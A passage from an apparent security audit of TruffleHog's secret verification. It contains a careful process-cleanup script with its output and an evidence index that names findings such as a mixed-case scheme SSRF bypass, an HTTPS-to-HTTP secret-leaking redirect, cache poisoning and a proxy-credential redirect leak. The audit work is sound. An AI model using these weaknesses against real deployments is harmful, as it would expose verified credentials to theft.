The following idempotent script terminates **only** the capture servers this harness started. It reads their PIDs from the `$TH/harness_pids` registry that `start_server` populated (§2.3), and before signalling each one it **re-validates ownership** by reading `/proc/<pid>/cmdline` and requiring that the live process's argv still carries **both** the harness root (`$TH`) **and** the exact `capture_server.py` script name — so a PID that was recycled onto an unrelated program is skipped. It performs **no** global process search (`ps`/`pgrep`/name-grep are absent), so an unrelated same-named process — even PID 1 — can never be selected; it removes every `/tmp` artifact by explicit path; and it runs its work inside an `EXIT` trap so cleanup happens even on interrupt. Its execution output is captured in §13.4.

```bash
# ---- scripts/09_cleanup.sh ----
#!/usr/bin/env bash
# Idempotent teardown: terminate ONLY the capture servers THIS harness started,
# identified from the $TH/harness_pids registry that start_server populated and
# re-validated against /proc/<pid>/cmdline (must carry BOTH the harness root and
# the exact capture_server.py name). There is NO global process search, so an
# unrelated same-named process — even PID 1 — is never selected. All work runs
# under an EXIT trap; artifacts are removed by explicit path only.
set -u
TH=/tmp/th_harness
BIN=/tmp/trufflehog
PIDFILE="$TH/harness_pids"

# Signal exactly one PID, and ONLY after proving from /proc that it is still one
# of our capture servers (guards against PID reuse and unrelated same-name procs).
kill_if_owned() {
  local pid="$1" cmd
  case "$pid" in ''|*[!0-9]*) return 0;; esac        # ignore blank/non-numeric
  kill -0 "$pid" 2>/dev/null || { echo "skip pid $pid: not running"; return 0; }
  cmd=$(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null) || cmd=""
  case "$cmd" in
    *"$TH"*capture_server.py*)
      kill "$pid" 2>/dev/null && echo "terminated owned pid $pid" ;;
    *)
      echo "skip pid $pid: not an owned harness process" ;;
  esac
}

cleanup() {
  echo "===== before: harness artifacts present? ====="
  ls -d "$TH" "$BIN" 2>/dev/null || true

  echo "===== terminate ONLY owned capture servers (from $PIDFILE, /proc-validated) ====="
  if [ -f "$PIDFILE" ]; then
    while IFS= read -r pid; do kill_if_owned "$pid"; done < "$PIDFILE"
    sleep 1
  else
    echo "no registry ($PIDFILE) — nothing owned to terminate"
  fi

  echo "===== prove each owned PID is gone (no global scan) ====="
  if [ -f "$PIDFILE" ]; then
    while IFS= read -r pid; do
      case "$pid" in ''|*[!0-9]*) continue;; esac
      kill -0 "$pid" 2>/dev/null && echo "STILL RUNNING owned pid $pid" || echo "gone: owned pid $pid"
    done < "$PIDFILE"
  fi

  echo "===== remove artifacts (explicit paths ONLY under /tmp) ====="
  rm -rf "$TH"; echo "rm $TH exit=$?"
  rm -f  "$BIN"; echo "rm $BIN exit=$?"

  echo "===== absence checks ====="
  [ -e "$TH"  ] && echo "STILL PRESENT: $TH"  || echo "ABSENT: $TH"
  [ -e "$BIN" ] && echo "STILL PRESENT: $BIN" || echo "ABSENT: $BIN"
}

trap cleanup EXIT
```

### 13.4 Cleanup execution (observed)

To prove the teardown terminates **only** processes it started, it was exercised against a deliberately adversarial process set: two capture servers started through the harness (PIDs recorded in `harness_pids`) **plus** one unrelated process started from a different directory (`/tmp/thqa_foreign/`) whose argv also contains `capture_server.py` and which was **not** recorded. A global name search — the pattern the earlier version used — matches **all three**, so the earlier version would have signalled the unrelated process (in QA's isolated-namespace replay this selected and attempted to kill **PID 1**):

```text
$ ps -eo pid,args | grep "[c]apture_server.py"      # NOT part of the teardown; shown only to expose the old hazard
831529 python3 /tmp/th_harness/capture_server.py      # owned (in registry)
831530 python3 /tmp/th_harness/capture_server.py      # owned (in registry)
831534 python3 /tmp/thqa_foreign/capture_server.py    # UNRELATED — must be spared
```

Running the registry-driven teardown (§13.3) — complete, unedited output:

```text
===== before: harness artifacts present? =====
/tmp/th_harness
/tmp/trufflehog
===== terminate ONLY owned capture servers (from /tmp/th_harness/harness_pids, /proc-validated) =====
terminated owned pid 831529
terminated owned pid 831530
===== prove each owned PID is gone (no global scan) =====
gone: owned pid 831529
gone: owned pid 831530
===== remove artifacts (explicit paths ONLY under /tmp) =====
rm /tmp/th_harness exit=0
rm /tmp/trufflehog exit=0
===== absence checks =====
ABSENT: /tmp/th_harness
ABSENT: /tmp/trufflehog
```

An out-of-band check after the run confirms the safety property — the two owned PIDs are gone, the unrelated same-named process survived untouched, and the teardown never referenced PID 1:

```text
owned   831529: terminated (good)
owned   831530: terminated (good)
foreign 831534: STILL ALIVE (good — unrelated process spared)
PID-1 reference in teardown output? 0
```

The teardown signalled exactly the two PIDs it had recorded and re-validated via `/proc`, left the unrelated same-named process running, and removed the binary and harness by explicit path. The repository's working tree contains only the single modified document; the source tree is byte-for-byte unchanged.

---

## 14. Command-indexed evidence appendix

This appendix makes the investigation reproducible and states, per area, exactly **which command produced each claim** and **which raw capture it wrote**, and whether the block embedded in the body is shown **complete** or **filtered** (a filtered block always shows its `grep`/`head`/`sed`/`wc` filter inline, per §13.2). Every producing script is itself embedded in this document — `scripts/lib.sh` (§2.3) plus the per-scenario block cited in the "Producing script" column — so any capture can be regenerated by running that script; the capture files below are the artifacts those runs wrote into the harness evidence directory `$EV = /tmp/th_harness/ev2/` (ephemeral, under `/tmp`, removed by the §13 teardown). All secrets are the synthetic canonical token (§2.3); all servers bind loopback only.

| # | Area (question part) | Body § | Producing script (embedded) | Raw capture file(s) under `/tmp/th_harness/ev2/` | In-doc fidelity |
|---|----------------------|--------|------------------------------|---------------------------------------------------|-----------------|
| 1 | Baseline verified result over loopback | §2, §3.1 | §2.4 smoke run + `lib.sh` | `smoke.log` | complete |
| 2 | SSRF reachability — mixed-case scheme gate (`HTTP`/`Http`/`hTtP` bypass vs lowercase `http` reject) | §3.5 | §3.5 `mc_*` block | `mc_UPPER_HTTP.log`, `mc_Title_Http.log`, `mc_mixed_hTtP.log`, `mc_lower_http.log`, `mc_body.log` | complete |
| 3 | TLS untrusted-cert failure downgraded to `unknown`; error swallowed at `--log-level=5` | §4.2, §4.4 | §4.2 / §4.4 blocks | `tlsh_diag.log`, `tlsh_diag2.log` (+ the CLI trace referenced in §4.4) | **filtered** — 154-line trace reduced to security-relevant lines (filter shown inline) |
| 4 | TLS trusted-CA hostname mismatch (wrong vs correct SAN) | §4.3 | §4.3 `tlsh_*` block | `tlsh_TRUSTED_CA_WRONG_SAN.log` + `…_cli.out`, `tlsh_TRUSTED_CA_CORRECT_SAN.log` + `…_cli.out` | complete |
| 5 | Data surface — exact JSON secret body + headers on 200/403 | §6.1–§6.4 | §6.x `ds_*` blocks (shown inline) | inline in body (server-captured request shown complete) | complete |
| 6 | Header semantics — configured `User-Agent` override, `Host`/`Content-Length` regeneration, duplicate/mixed-case keys | §6.6 | §6.6 `hs_*` block | `hs_A_baseline_no_UA.log`, `hs_B_configured_UA_overrides.log`, `hs_C_host_and_contentlength_regenerated.log` | complete |
| 7 | HTTPS→HTTP cleartext downgrade on redirect (secret + headers replayed on hop-2) | §6.5 | §6.5 `dg_*` block | `dg_cli.out`, `dg_hop1_https.log`, `dg_hop2_http.log` | complete |
| 8 | Response read-back memory amplification (0/8/32/64/128 MiB body → peak RSS) | §6.8 | §6.8 `mem_*` block | `mem_0MiB.out`, `mem_8MiB.out`, `mem_32MiB.out`, `mem_64MiB.out`, `mem_128MiB.out` | complete |
| 9 | Verification-cache concurrency matrix (cache ON `--concurrency=1` ×3, ON `=128` ×3, OFF), incl. latency variant | §7.5 | §7.5 `cc_*` / `ccl_*` block | `cc_ON_c1_run{1,2,3}.{log,out}`, `cc_ON_c128_run{1,2,3}.{log,out}`, `cc_OFF_c128.{log,out}`, `ccl_ON_c1.{log,out}`, `ccl_ON_c128_r{1,2,3}.{log,out}`, `ccl_OFF_c128.{log,out}` | complete (aggregated counts; per-run logs on disk) |
| 10 | Cross-detector cache poisoning (A-wins / B-wins, both orderings, repeated) | §7.6 | §7.6 `poison_*` / `dp_*` block | `poison_ON_orderAB.json`, `poison_ON_orderBA.json`, `poison_OFF_orderAB.json`, `poison_A200.log`, `poison_B403.log`, `dp_A_wins_r{1,2}.json` + `…_A.log`/`…_B.log`, `dp_B_wins_r{1,2}.json` + `…_A.log`/`…_B.log` | complete (aggregated; per-run JSON/logs on disk) |
| 11 | ReDoS — RE2 linear-time on `(a+)+$` with large input | §8 | §8.x `redos` block (shown inline) | inline in body (timing shown complete) | complete |
| 12 | Toolchain redirect header leak (`Proxy-Authorization` retained cross-origin; `Authorization`/`Cookie` stripped) — GO-2025-3751 | §11.5 | §11.5 `rl_*` block | `rl_hop1.log`, `rl_hop2.log` | complete |
| 13 | `govulncheck` binary-mode scan of the canonical build (58 called vulns) | §11.3 | §11.3 command | `/tmp/th_harness/gv_binary.txt` (732 lines) | **filtered** — two cited advisory blocks + summary line (elision marked; full capture on disk) |
| 14 | `govulncheck` source-mode scan scoped to in-scope packages (27 called) | §11.4 | §11.4 command | `/tmp/th_harness/gv_source_scoped.txt` (318 lines) | **filtered** — cited `GO-2025-3751` trace + summary (elision marked; full capture on disk) |
| 15 | Safe teardown — owned-only termination, unrelated same-named process spared | §13.4 | §13.3 `09_cleanup.sh` | transcript embedded in §13.4 (adversarial owned + foreign PIDs) | complete |

**Reading.** Rows marked *complete* embed the full producing output (for multi-run scenarios, the aggregated result is in the body and each individual run's log/JSON is named above). The three *filtered* rows (#3, #13, #14) are the only blocks reduced for length; each shows its filter inline and its complete raw capture is named above. This index, together with the fidelity note in §13.2 and the per-block qualifiers in §1, §4.4, §11.3, and §11.4, is the basis for the completeness claims in this document: the claims are backed by the named commands and captures, and the two intrinsically-long enumerations are disclosed as filtered rather than presented as fully embedded.
